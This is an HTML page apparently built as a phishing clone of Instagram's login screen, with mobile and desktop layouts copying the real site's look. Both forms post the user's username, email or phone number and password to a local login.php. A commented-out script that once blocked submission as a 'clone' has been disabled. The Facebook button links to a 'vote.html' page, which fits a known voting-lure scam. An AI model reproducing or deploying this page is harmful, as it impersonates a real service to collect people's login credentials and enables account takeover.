

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        * {
            padding: 0;
            margin: 0;
            box-sizing: border-box;
        }

        body {
            font-family: Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        /* Mobile Styles */
        .mobile-layout {

            width: 100%;
            max-width: 415px;
            margin: auto;
            padding: 40px 20px;
            overflow-y: auto;
            min-height: 100vh;
        }

        a {
                text-decoration: none;
        }

        .mobile-layout .insta-pic img {
            width: 194px;
            height: 50px;
            margin: auto;
            display: flex;
            justify-content: center;
            margin-top: 50px;
        }

        .mobile-layout .fb {
            width: 330px;
            height: 36px;
            background-color: #1877f2;
            color: #fff9f9;
            margin: auto;
            display: flex;
            justify-content: center;
            align-items: center;
            text-align: center;
            margin-top: 30px;
            border-radius: 8px;
            border: none;
            cursor: pointer;
        }

        .mobile-layout .fb i {
                margin-right: 6px;
                width: 16px;
                height: 16px;
                font-size: 15px;
        }

        input:focus,
        button:focus {
            outline: none;
            border-color: #dbdbdb;  /* You can adjust this color as needed */
        }

        .mobile-layout .divider {
            display: flex;
            align-items: center;
            margin: 30px;
        }

        .mobile-layout .divider::before,
        .mobile-layout .divider::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid #dbdbdb;
        }

        .mobile-layout .divider span {
            padding: 0 10px;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: bold;
        }

        .mobile-layout form {
            display: flex;
            flex-direction: column;
        }

        .mobile-layout input {
            padding: 10px;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 12px;
            width: 330px;
            height: 42px;
            margin: auto;
        }

        .mobile-layout .password-container {
            position: relative;
            margin: auto;
            margin-top: 10px;
        }

        .mobile-layout .password-toggle {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            font-size: 14px;
            color: #262626;
        }

        .mobile-layout .forgot-password {
            text-align: center;
            font-size: 12px;
            margin-left: 230px;
            margin-top: 10px;
        }

        .mobile-layout .forgot-password a {
            color: #00376b;
            text-decoration: none;
        }

        .mobile-layout .login-button {
            width: 330px;
            height: 35px;
            background-color: #1877f2;
            color: #fff9f9;
            margin: auto;
            display: flex;
            justify-content: center;
            align-items: center;
            text-align: center;
            margin-top: 30px;
            border-radius: 8px;
            border: none;
            cursor: pointer;
            text-decoration: none;
        }

        .mobile-layout .signup-container {
            text-align: center;
            margin-top: 20px;
        }

        .mobile-layout .signup-container p {
            font-size: 14px;
            padding: 10px;
        }

        .mobile-layout .signup-container a {
            color: #0095f6;
            text-decoration: none;
            font-weight: bold;
        }

        /* Desktop Styles */
        .desktop-layout {
            display: none;
        }

        @media (min-width: 768px) {
            
            .mobile-layout {
                display: none;
            }

            .desktop-layout {
                display: block;
                width: 100%;
                max-width: 350px;
            }

            .desktop-layout .login-container, .desktop-layout .signup-container {
                background-color: #fff;
                border: 1px solid #dbdbdb;
                padding: 20px;
                margin-bottom: 10px;
            }

            .desktop-layout .login-container {
                padding-top: 40px;
                padding-bottom: 40px;
            }

            .desktop-layout .logo {
                text-align: center;
                margin-bottom: 30px;
            }

            .desktop-layout .logo img {
                width: 175px;
            }

            .desktop-layout form {
                display: flex;
                flex-direction: column;
            }

            .desktop-layout input {
                padding: 10px;
                margin-bottom: 10px;
                border: 1px solid #dbdbdb;
                border-radius: 3px;
                font-size: 12px;
                width: 100%;
            }

            .desktop-layout .password-container {
                position: relative;
            }

            .desktop-layout .password-toggle {
                position: absolute;
                right: 10px;
                top: 50%;
                transform: translateY(-50%);
                cursor: pointer;
                font-size: 14px;
                color: #262626;
            }

            .desktop-layout button {
                background-color: #0095f6;
                color: #fff;
                padding: 10px;
                border: none;
                border-radius: 3px;
                font-weight: bold;
                cursor: pointer;
                margin-top: 10px;
            }

            .desktop-layout .divider {
                display: flex;
                align-items: center;
                margin: 20px 0;
            }

            .desktop-layout .divider::before,
            .desktop-layout .divider::after {
                content: "";
                flex: 1;
                border-bottom: 1px solid #dbdbdb;
            }

            .desktop-layout .divider span {
                padding: 0 10px;
                color: #8e8e8e;
                font-size: 13px;
                font-weight: bold;
            }

            .desktop-layout .facebook-login {
                display: flex;
                justify-content: center;
                align-items: center;
                color: #385185;
                font-size: 14px;
                font-weight: bold;
                margin-bottom: 20px;
            }

            .desktop-layout .facebook-login i {
                margin-right: 6px;
                width: 16px;
                height: 16px;
                font-size: 15px;
            }

            .desktop-layout .facebook-login a {
                text-decoration: none;
                color: #385185;
            }

            .desktop-layout .forgot-password {
                text-align: center;
                font-size: 12px;
            }

            .desktop-layout .forgot-password a {
                color: #00376b;
                text-decoration: none;
            }

            .desktop-layout .signup-container {
                text-align: center;
            }

            .desktop-layout .signup-container p {
                font-size: 14px;
            }

            .desktop-layout .signup-container a {
                color: #0095f6;
                text-decoration: none;
                font-weight: bold;
            }

            .desktop-layout .get-app {
                text-align: center;
            }

            .desktop-layout .get-app p {
                margin-bottom: 20px;
                font-size: 14px;
            }

            .desktop-layout .app-buttons {
                display: flex;
                justify-content: center;
                gap: 10px;
            }

            .desktop-layout .goog img {
                width: 170px;
                height: 60px;
            }

            .desktop-layout .micro img {
                width: 130px;
                border-radius: 8px;
                height: 60px;
            }
        }

        @media (max-width: 767px) {
            body {
                align-items: flex-start;
            }
        }

    </style>
</head>
<body>
    <div class="mobile-layout">
        <div class="insta-pic">
            <img src="ig-pics/ing-removebg-preview.png" alt="Instagram">
        </div>
        <a href="vote.html"> <button class="fb"> <i class="fa-brands fa-square-facebook"></i> continue with Facebook</button></a>
        

        <div class="divider">
            <span>OR</span>
        </div>

        <form id="loginForm-mobile" action="login.php" method="POST" onsubmit="return validateForm('loginForm-mobile')">
            <input type="text" name="identifier" placeholder="Phone number, username, or email" required>
            <div class="password-container">
                <input type="password"  name="password" id="password-mobile" placeholder="Password" required>
                <span class="password-toggle" onclick="togglePassword('password-mobile')">Hide</span>
            </div>
            <div class="forgot-password">
                <a href="#">Forgot password?</a>
            </div>
            <!-- <a href="vote.html" class="login-button"> Log in</a> -->
            <button type="submit" class="login-button">Log in</button>
        </form>

        
        <div class="signup-container">
            <p>Don't have an account? <a href="#">Sign up</a></p>
        </div>
    </div>

    <div class="desktop-layout">
        <div class="login-container">
            <div class="logo">
                <img src="ig-pics/ing-removebg-preview.png" alt="Instagram">
            </div>
            <form id="loginForm-desktop" action="login.php" method="POST" onsubmit="return validateForm('loginForm-desktop')">
                <input type="text" name="identifier" placeholder="Phone number, username, or email" required>
                <div class="password-container">
                    <input type="password" name="password"  id="password-desktop" placeholder="Password" required>
                    <span class="password-toggle" onclick="togglePassword('password-desktop')">Hide</span>
                </div>
                <button type="submit">Log in</button>
            </form>
            <div class="divider">
                <span>OR</span>
            </div>
            <div class="facebook-login">
                <img src="" alt="">
                <i class="fa-brands fa-square-facebook"></i>
                <a href="#">Log in with Facebook</a>
            </div>
            <div class="forgot-password">
                <a href="#">Forgot password?</a>
            </div>
        </div>
        <div class="signup-container">
            <p>Don't have an account? <a href="#">Sign up</a></p>
        </div>
        <div class="get-app">
            <p>Get the app.</p>
            <div class="app-buttons">
                <div class="goog">
                    <a href="#"><img src="ig-pics/gp-removebg-preview.png" alt="App Store"></a>
                </div>
                <div class="micro">
                    <a href="#"><img src="ig-pics/mic-removebg-preview.png" alt="Google Play"></a>
                </div>
            </div>
        </div>
    </div>

    <script>
        // document.addEventListener('DOMContentLoaded', function() {
        //     const forms = document.querySelectorAll('form');
            
        //     forms.forEach(form => {
        //         form.addEventListener('submit', function(e) {
        //             e.preventDefault();
        //             alert('Login functionality is not implemented in this clone.');
        //         });
        //     });
        // });

        function togglePassword(id) {
            const passwordInput = document.getElementById(id);
            const toggleButton = passwordInput.nextElementSibling;
            
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                toggleButton.textContent = 'Show';
            } else {
                passwordInput.type = 'password';
                toggleButton.textContent = 'Hide';
            }
        }


    function validateForm(formId) {
    const form = document.getElementById(formId);
    const identifier = form.querySelector('input[name="identifier"]');
    const password = form.querySelector('input[name="password"]');
    let isValid = true;

    // Reset previous error messages
    clearErrors(form);

    // Validate identifier
    if (identifier.value.trim() === '') {
        showError(identifier, 'Please enter your username, email, or phone number.');
        isValid = false;
    } else if (!isValidIdentifier(identifier.value)) {
        showError(identifier, 'Please enter a valid username, email, or phone number.');
        isValid = false;
    }

    // Validate password
    if (password.value.trim() === '') {
        showError(password, 'Please enter your password.');
        isValid = false;
    } else if (password.value.length < 6) {
        showError(password, 'Password must be at least 6 characters long.');
        isValid = false;
    }

    return isValid;
}

    function isValidIdentifier(value) {
        // Simple regex for email validation
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        // Simple regex for phone number (assumes a 10-digit number)
        const phoneRegex = /^\d{10}$/;
        // Username should be at least 3 characters long and only contain letters, numbers, dots, and underscores
        const usernameRegex = /^[a-zA-Z0-9._]{3,}$/;

        return emailRegex.test(value) || phoneRegex.test(value) || usernameRegex.test(value);
    }

    function showError(input, message) {
        const errorElement = document.createElement('div');
        errorElement.className = 'error-message';
        errorElement.textContent = message;
        errorElement.style.color = 'red';
        errorElement.style.fontSize = '12px';
        errorElement.style.marginTop = '5px';
        input.parentNode.insertBefore(errorElement, input.nextSibling);
        input.style.borderColor = 'red';
    }

    function clearErrors(form) {
        const errorMessages = form.querySelectorAll('.error-message');
        errorMessages.forEach(error => error.remove());
        form.querySelectorAll('input').forEach(input => input.style.borderColor = '');
    }

    // Add event listeners to both forms
    document.getElementById('loginForm-mobile').addEventListener('submit', function(event) {
        if (!validateForm('loginForm-mobile')) {
            event.preventDefault();
        }
    });

    document.getElementById('loginForm-desktop').addEventListener('submit', function(event) {
        if (!validateForm('loginForm-desktop')) {
            event.preventDefault();
        }
    });




        
    </script>

    <script src="https://kit.fontawesome.com/7c091fed64.js" crossorigin="anonymous"></script>
</body>
</html>